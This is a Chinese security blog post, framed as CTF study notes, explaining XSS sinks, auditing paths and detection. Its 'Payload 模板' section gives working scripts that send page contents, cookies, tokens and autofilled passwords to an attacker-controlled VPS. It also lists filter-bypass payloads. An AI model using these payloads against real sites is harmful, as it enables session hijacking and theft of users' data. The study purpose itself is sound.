@@ -1,0 +1,445 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>XSS 跨站脚本攻击 | Echoin 的博客</title><meta name="author" content="Echoin"><meta name="copyright" content="Echoin"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f5fd"><meta name="description" content="XSS跨站脚本攻击原理、审计路径与利用打法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS 跨站脚本攻击">
+<meta property="og:url" content="https://echoin.xyz/2026/08/14/xss/index.html">
+<meta property="og:site_name" content="Echoin 的博客">
+<meta property="og:description" content="XSS跨站脚本攻击原理、审计路径与利用打法">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://echoin.xyz/img/butterfly-icon.png">
+<meta property="article:published_time" content="2026-08-14T06:00:00.000Z">
+<meta property="article:modified_time" content="2026-08-14T04:05:53.641Z">
+<meta property="article:author" content="Echoin">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="跨站脚本">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://echoin.xyz/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "XSS 跨站脚本攻击",
+  "url": "https://echoin.xyz/2026/08/14/xss/",
+  "image": "https://echoin.xyz/img/butterfly-icon.png",
+  "datePublished": "2026-08-14T06:00:00.000Z",
+  "dateModified": "2026-08-14T04:05:53.641Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Echoin",
+      "url": "https://github.com/Echoin-613"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://echoin.xyz/2026/08/14/xss/index.html"><link rel="preconnect"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.7.0"><link rel="stylesheet" href="/pluginsSrc/@fortawesome/fontawesome-free/css/all.min.css?v=7.3.1"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        const data = { value }
+
+        if (ttl != null) {
+          data.expiry = Date.now() + ttl * 86400000
+        }
+
+        localStorage.setItem(key, JSON.stringify(data))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#f7f5fd')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: '/pluginsSrc/@egjs/infinitegrid/dist/infinitegrid.min.js?v=4.13.0',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'XSS 跨站脚本攻击',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Echoin 的博客" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Echoin 的博客" type="application/rss+xml">
+</head><body><div class="bg-animation" id="web_bg" style="background: linear-gradient(135deg,;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/payloads/"><i class="fa-fw fas fa-database"></i><span> Payload库</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Echoin 的博客</span></a><a class="nav-page-title" href="/"><span class="site-name">XSS 跨站脚本攻击</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/payloads/"><i class="fa-fw fas fa-database"></i><span> Payload库</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">XSS 跨站脚本攻击</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-08-14T06:00:00.000Z" title="发表于 2026-08-14 14:00:00">2026-08-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-08-14T04:05:53.641Z" title="更新于 2026-08-14 12:05:53">2026-08-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="1-一句话本质"><a href="#1-一句话本质" class="headerlink" title="1. 一句话本质"></a>1. 一句话本质</h2><p>用户的输入被浏览器当成「代码」执行，而不是「纯文本」显示。本质是打破输入与输出的信任边界，浏览器无法区分恶意与正常脚本。</p>
+<blockquote>
+<p><strong>CTF 识别信号</strong>：源码里出现 <code>bot</code> &#x2F; <code>puppeteer</code> &#x2F; <code>headless</code> &#x2F; <code>chromium</code> 关键词 → 99% 考 XSS。bot 的作用就是模拟管理员访问页面，触发你的 XSS。</p>
+<p><strong>外带</strong> &#x3D; 让 bot 的浏览器（在 admin 会话里）主动把读到的数据，当成一个「请求」发到你自己的服务器上。</p>
+</blockquote>
+<h2 id="2-代码特征（看到-有洞）"><a href="#2-代码特征（看到-有洞）" class="headerlink" title="2. 代码特征（看到&#x3D;有洞）"></a>2. 代码特征（看到&#x3D;有洞）</h2><h3 id="特征-A：后端输出到-HTML-没转义"><a href="#特征-A：后端输出到-HTML-没转义" class="headerlink" title="特征 A：后端输出到 HTML 没转义"></a>特征 A：后端输出到 HTML 没转义</h3><table>
+<thead>
+<tr>
+<th>危险写法</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&#96;{{ x</td>
+<td>safe }}&#96;</td>
+</tr>
+<tr>
+<td><code>{% autoescape false %}</code></td>
+<td>整块关转义</td>
+</tr>
+<tr>
+<td><code>render_template_string(f&quot;...{u}&quot;)</code></td>
+<td>字符串拼接模板</td>
+</tr>
+<tr>
+<td><code>echo $GET[&#39;x&#39;]</code>（PHP）</td>
+<td>直接输出</td>
+</tr>
+<tr>
+<td><code>&lt;%= param %&gt;</code>（JSP）</td>
+<td>直接输出</td>
+</tr>
+<tr>
+<td>手拼 HTML 字符串再输出</td>
+<td>无转义</td>
+</tr>
+</tbody></table>
+<h3 id="特征-B：前端把数据塞进「能执行-能解析-HTML」的-API"><a href="#特征-B：前端把数据塞进「能执行-能解析-HTML」的-API" class="headerlink" title="特征 B：前端把数据塞进「能执行 &#x2F; 能解析 HTML」的 API"></a>特征 B：前端把数据塞进「能执行 &#x2F; 能解析 HTML」的 API</h3><ul>
+<li><strong>解析 HTML</strong>：<code>innerHTML</code> &#x2F; <code>outerHTML</code> &#x2F; <code>document.write</code> &#x2F; <code>insertAdjacentHTML</code> &#x2F; jQuery <code>.html()</code> &#x2F; Vue <code>v-html</code> &#x2F; React <code>dangerouslySetInnerHTML</code></li>
+<li><strong>执行字符串</strong>：<code>eval()</code> &#x2F; <code>Function()</code> &#x2F; <code>setTimeout(&quot;str&quot;)</code> &#x2F; <code>setInterval(&quot;str&quot;)</code></li>
+<li><strong>跳转&#x2F;加载</strong>：<code>location.href=</code> &#x2F; <code>location.replace()</code> &#x2F; <code>window.open()</code> &#x2F; <code>iframe.src=</code></li>
+<li><strong>安全对照</strong>：<code>textContent</code> &#x2F; <code>.text()</code></li>
+</ul>
+<h3 id="特征-C：三个助推漏洞"><a href="#特征-C：三个助推漏洞" class="headerlink" title="特征 C：三个助推漏洞"></a>特征 C：三个助推漏洞</h3><ul>
+<li>无 CSP，或 <code>script-src &#39;unsafe-inline&#39;</code></li>
+<li>Cookie 无 HttpOnly（XSS 可偷 session）</li>
+<li>只过滤不转义（过滤可绕过：大小写&#x2F;编码&#x2F;双写）</li>
+</ul>
+<h3 id="容易漏的-sink"><a href="#容易漏的-sink" class="headerlink" title="容易漏的 sink"></a>容易漏的 sink</h3><ul>
+<li><code>javascript:</code> 伪协议（<code>&lt;a href&gt;</code>、<code>&lt;img src&gt;</code>、<code>&lt;iframe src&gt;</code>）</li>
+<li><code>srcdoc</code>、<code>&lt;meta http-equiv=&quot;refresh&quot;&gt;</code>、<code>&lt;object data&gt;</code>、<code>&lt;embed src&gt;</code></li>
+<li><code>postMessage</code> 的 <code>onmessage</code> 回调里直接 <code>innerHTML</code> &#x2F; <code>eval</code>（payload 不进服务端日志）</li>
+<li>CSS <code>style</code> 属性 &#x2F; <code>&lt;style&gt;</code> 里的 <code>expression()</code></li>
+</ul>
+<h2 id="3-审计路径（source→sink）"><a href="#3-审计路径（source→sink）" class="headerlink" title="3. 审计路径（source→sink）"></a>3. 审计路径（source→sink）</h2><ol>
+<li><strong>找 Sink（出口）</strong>：grep <code>innerHTML</code> &#x2F; <code>document.write</code> &#x2F; <code>eval</code> &#x2F; <code>|safe</code> &#x2F; <code>echo $</code></li>
+<li><strong>追 Source</strong>：数据来自 URL 参数 &#x2F; 表单 &#x2F; Cookie &#x2F; 存储（数据库）？</li>
+<li><strong>判定</strong>：Source 可控（用户输入）+ Sink 未转义 → 漏洞成立</li>
+</ol>
+<blockquote>
+<p><strong>存储型 XSS 是跨文件污点追踪</strong>：<code>输入 → [存库代码] → 数据库 → [渲染代码] → 浏览器</code>。<br>要<strong>同时盯写库和渲染两端</strong>——很多项目写库时过滤了、渲染时没转义，或反之；只要一端不设防即可利用。</p>
+</blockquote>
+<h2 id="4-白盒验证"><a href="#4-白盒验证" class="headerlink" title="4. 白盒验证"></a>4. 白盒验证</h2><ul>
+<li>追数据流：确认 source 可控、sink 未转义</li>
+<li>查兜底：是否有 CSP &#x2F; 全局过滤 &#x2F; sanitizer</li>
+<li>确认注入点上下文（HTML 内容区 &#x2F; 属性值 &#x2F; script 内）→ 决定 payload 写法</li>
+</ul>
+<h2 id="5-黑盒验证"><a href="#5-黑盒验证" class="headerlink" title="5. 黑盒验证"></a>5. 黑盒验证</h2><p>① 输入 <code>&#39;&quot;&gt;&lt;svg onload=alert(1)&gt;</code><br>② 查看源码：输入出现在哪？被转义了吗？<br>③ 按回显位置换 payload：</p>
+<table>
+<thead>
+<tr>
+<th>回显位置</th>
+<th>payload</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>直接出现在 HTML 内容区</td>
+<td><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+</tr>
+<tr>
+<td>出现在 <code>value=&quot;★&quot;</code> 里</td>
+<td><code>&quot;&gt;&lt;img src=x onerror=alert(1)&gt;</code></td>
+</tr>
+<tr>
+<td>出现在 <code>&lt;script&gt;var x=&#39;★&#39;&lt;/script&gt;</code></td>
+<td><code>&#39;;alert(1);//</code></td>
+</tr>
+<tr>
+<td>出现在 <code>&lt;a href=&quot;★&quot;&gt;</code></td>
+<td><code>javascript:alert(1)</code></td>
+</tr>
+<tr>
+<td>被转义成 <code>&amp;lt;</code></td>
+<td>尝试解码绕过（编码&#x2F;大小写&#x2F;双写）</td>
+</tr>
+</tbody></table>
+<p>④ 弹了 → 判断反射&#x2F;存储 → 换成外带版</p>
+<h2 id="6-利用与打法"><a href="#6-利用与打法" class="headerlink" title="6. 利用与打法"></a>6. 利用与打法</h2><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>数据路径</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>反射型</td>
+<td>输入→服务器→原样响应→浏览器执行</td>
+<td>不存储，需受害者点链接（CTF 配 bot）</td>
+</tr>
+<tr>
+<td>存储型</td>
+<td>输入→存库→渲染→浏览器</td>
+<td>永久存储，bot 正常访问就被打，危害最大</td>
+</tr>
+<tr>
+<td>DOM XSS</td>
+<td>URL 参数&#x2F;hash→前端 JS→写 DOM</td>
+<td>不经过服务器拼接，payload 不在响应 HTML 里</td>
+</tr>
+</tbody></table>
+<p><strong>外带思路</strong>：让 bot 的浏览器（admin 会话）把读到的数据发到你的 VPS：<br><code>触发 XSS → fetch 目标数据 → new Image().src=你的VPS → VPS 解码</code></p>
+<h2 id="7-Payload-模板"><a href="#7-Payload-模板" class="headerlink" title="7. Payload 模板"></a>7. Payload 模板</h2><h3 id="通用外带（一步）"><a href="#通用外带（一步）" class="headerlink" title="通用外带（一步）"></a>通用外带（一步）</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&quot;目标URL&quot;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>r.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">t</span>=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&quot;http://你的VPS:8080/?d=&quot;</span>+<span class="built_in">encodeURIComponent</span>(t);</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="通用外带（两步：先拿-ID-再读详情）"><a href="#通用外带（两步：先拿-ID-再读详情）" class="headerlink" title="通用外带（两步：先拿 ID 再读详情）"></a>通用外带（两步：先拿 ID 再读详情）</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&quot;列表页URL&quot;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>r.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">h</span>=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> id=h.<span class="title function_">split</span>(<span class="string">&quot;分隔符&quot;</span>)[<span class="number">1</span>].<span class="title function_">substring</span>(<span class="number">0</span>,<span class="variable constant_">ID</span>长度);</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">fetch</span>(<span class="string">&quot;详情页URL&quot;</span>+id).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>r.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">t</span>=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&quot;http://VPS:8080/?d=&quot;</span>+<span class="built_in">encodeURIComponent</span>(t);</span></span><br><span class="line"><span class="language-javascript">  &#125;);</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="遍历多个-ID"><a href="#遍历多个-ID" class="headerlink" title="遍历多个 ID"></a>遍历多个 ID</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">t.<span class="title function_">split</span>(<span class="string">&quot;分隔符&quot;</span>).<span class="title function_">slice</span>(<span class="number">1</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">p</span>=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> id=p.<span class="title function_">substring</span>(<span class="number">0</span>,<span class="number">40</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">fetch</span>(<span class="string">&quot;详情页URL&quot;</span>+id).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>r.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">t</span>=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&quot;http://VPS:8080/?d=&quot;</span>+<span class="built_in">encodeURIComponent</span>(t);</span></span><br><span class="line"><span class="language-javascript">  &#125;);</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="读什么数据的变体"><a href="#读什么数据的变体" class="headerlink" title="读什么数据的变体"></a>读什么数据的变体</h3><table>
+<thead>
+<tr>
+<th>目标</th>
+<th>代码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>页面文本</td>
+<td><code>fetch(url).then(r=&gt;r.text())</code></td>
+</tr>
+<tr>
+<td>JSON 接口</td>
+<td><code>fetch(url).then(r=&gt;r.text())</code>（text 够用）</td>
+</tr>
+<tr>
+<td>Cookie</td>
+<td><code>new Image().src=&quot;http://VPS:8080/?d=&quot;+encodeURIComponent(document.cookie)</code></td>
+</tr>
+<tr>
+<td>localStorage</td>
+<td><code>...encodeURIComponent(localStorage.getItem(&quot;token&quot;))</code></td>
+</tr>
+<tr>
+<td>整份 DOM</td>
+<td><code>...encodeURIComponent(document.documentElement.outerHTML)</code></td>
+</tr>
+<tr>
+<td>自动填充密码</td>
+<td><code>...document.querySelector(&quot;input[type=password]&quot;).value</code></td>
+</tr>
+<tr>
+<td>当前页 URL</td>
+<td><code>...location.href</code></td>
+</tr>
+</tbody></table>
+<h3 id="注入点特殊情况"><a href="#注入点特殊情况" class="headerlink" title="注入点特殊情况"></a>注入点特殊情况</h3><table>
+<thead>
+<tr>
+<th>情况</th>
+<th>约束</th>
+<th>对策</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>A：二次转义（repr&#x2F;JSON）</td>
+<td>禁单引号、禁反斜杠</td>
+<td>payload 全用双引号；用 <code>h.split(&quot;/s/&quot;)[1]</code> 不用正则</td>
+</tr>
+<tr>
+<td>B：HTML 属性里</td>
+<td>不能有 <code>&quot;</code>（会闭合属性）</td>
+<td>用 <code>&amp;#39;/&amp;quot;</code> 或反引号，payload 用 <code>&#39;...&#39;</code></td>
+</tr>
+<tr>
+<td>C：<code>&lt;script&gt;</code> 标签内</td>
+<td>防 <code>&lt;/script&gt;</code> 提前闭合</td>
+<td><code>&lt;/script&gt;&lt;script&gt;fetch(...)&lt;/script&gt;</code></td>
+</tr>
+</tbody></table>
+<h3 id="服务器监听"><a href="#服务器监听" class="headerlink" title="服务器监听"></a>服务器监听</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8080</span><br></pre></td></tr></table></figure>
+
+<h2 id="8-绕过"><a href="#8-绕过" class="headerlink" title="8. 绕过"></a>8. 绕过</h2><table>
+<thead>
+<tr>
+<th>被过滤的东西</th>
+<th>绕过</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>空格（属性分隔）</td>
+<td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code>（标签内直接写 JS）；<code>&lt;svg onload&gt;</code>、<code>&lt;details open ontoggle&gt;</code></td>
+</tr>
+<tr>
+<td>点号（属性访问）</td>
+<td><code>fetch(&quot;/&quot;)[&quot;then&quot;](function(r){return r[&quot;text&quot;]()})</code></td>
+</tr>
+<tr>
+<td>单引号</td>
+<td>改用双引号 <code>fetch(&quot;/&quot;)</code></td>
+</tr>
+<tr>
+<td>URL 中的点号</td>
+<td>十六进制 IP：<code>http://192.168.1.100</code> → <code>http://0xc0a80164</code></td>
+</tr>
+<tr>
+<td>return 后需要空格</td>
+<td><code>return(fetch(&quot;/&quot;))</code>；箭头函数 <code>r=&gt;r[&quot;text&quot;]()</code></td>
+</tr>
+<tr>
+<td>标签被过滤</td>
+<td>换标签&#x2F;事件：<code>&lt;svg onload&gt;</code>、<code>&lt;img src=x onerror&gt;</code>、<code>&lt;details open ontoggle&gt;</code></td>
+</tr>
+<tr>
+<td>大小写过滤</td>
+<td><code>&lt;ScRiPt&gt;</code>、<code>JaVaScRiPt:</code></td>
+</tr>
+<tr>
+<td><code>javascript:</code> 被滤</td>
+<td><code>java\nscript:</code>、HTML 实体 <code>&amp;#106;avascript:</code></td>
+</tr>
+<tr>
+<td>关键字被滤</td>
+<td>字符串拼接 <code>alert</code>、<code>top[&#39;alert&#39;](1)</code>、<code>window[&#39;al&#39;+&#39;ert&#39;]</code></td>
+</tr>
+<tr>
+<td><code>alert</code> 被滤</td>
+<td><code>confirm(1)</code>、<code>prompt(1)</code>、<code>print()</code></td>
+</tr>
+</tbody></table>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="https://github.com/Echoin-613">Echoin</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://echoin.xyz/2026/08/14/xss/">https://echoin.xyz/2026/08/14/xss/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://echoin.xyz" target="_blank">Echoin 的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/XSS/">XSS</a><a class="post-meta__tags" href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/">跨站脚本</a></div><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="/pluginsSrc/butterfly-extsrc/sharejs/dist/css/share.min.css?v=1.1.6" media="print" onload="this.media='all'"><script src="/pluginsSrc/butterfly-extsrc/sharejs/dist/js/social-share.min.js?v=1.1.6" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/08/14/http-request-smuggling/" title="HTTP 请求走私"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">HTTP 请求走私</div></div><div class="info-2"><div class="info-item-1">HTTP请求走私是一种攻击技术，利用前端和后端服务器对HTTP请求的解析差异，将恶意请求夹带在合法请求中，从而绕过安全控制，访问敏感数据或攻击其他用户。 漏洞原理：HTTP请求走私漏洞的产生主要是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：Content-Length头和Transfer-Encoding头。前端和后端服务器可能对这两种头的处理方式不同，从而导致请求边界的不同步。 Content-Length头 123456POST /search HTTP/1.1Host: normal-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 11q=smuggling  Transfer-Encoding头 12345678POST /search HTTP/1.1Host: normal-website.comContent-Type: application/x-www-form-urlencodedTransfer-Encoding: chunkedbq=smugg...</div></div></div></a><a class="pagination-related" href="/2026/08/14/sql-prepared-statement-bypass/" title="SQL 预编译及绕过"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">SQL 预编译及绕过</div></div><div class="info-2"><div class="info-item-1">预编译与sql注入，正则回溯绕过，mysql常见绕过，报错注入7大常用函数 - 技术栈 预编译的基础原理与作用1. 